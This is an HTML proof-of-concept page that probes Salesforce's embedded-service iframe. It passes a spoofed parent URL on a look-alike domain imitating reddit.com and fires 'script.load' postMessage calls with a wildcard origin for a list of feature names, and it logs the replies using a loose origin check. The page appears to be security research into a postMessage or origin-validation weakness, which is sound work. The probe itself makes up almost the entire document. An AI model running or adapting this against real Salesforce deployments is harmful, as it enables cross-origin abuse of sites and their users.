<!DOCTYPE html>
<html>
<head>
  <title>Salesforce Feature Loader PoC</title>
</head>
<body>
  <h2>Salesforce script.load Feature Probe (v4.0)</h2>

  <iframe
    id="eswFrame"
    src="https://service.force.com/embeddedservice/4.0/esw.html?parent=https://reddit.com.wangdubruh.xyz"
    style="width:600px;height:400px;"
    onload="onIframeLoad()"
    allow="camera *; microphone *;">
  </iframe>

  <script>
    const iframe = document.getElementById("eswFrame");

    const features = [
      "chasitor",
      "filetransfer",
      "prechat",
      "bootstrap",
      "routing",
      "channels",
      "messageEvents",
      "customButtons",
      "proactive",         // observed in some orgs
      "metrics",           // used for analytics
      "journeyEvents",     // undocumented, sometimes seen
      "snapinsStarter",    // seen in early initialization
      "sidebar"            // UI-related in some builds
    ];

    window.addEventListener("message", (e) => {
      if (e.origin.includes("force.com") && e.data?.method === "script.load") {
        console.log(`ðŸ“© Loaded feature: ${e.data.feature}`);
      } else {
        console.log("ðŸ“© Message from iframe:", e.data);
      }
    });

    function onIframeLoad() {
      console.log("[+] Iframe loaded (Salesforce 4.0)");

      features.forEach((feature, i) => {
        setTimeout(() => {
          console.log(`ðŸ“¤ Sending script.load for: ${feature}`);
          iframe.contentWindow.postMessage({
            method: "script.load",
            feature: feature
          }, "*");
        }, i * 400); // staggered to avoid race or overwrite
      });
    }
  </script>
</body>
</html>
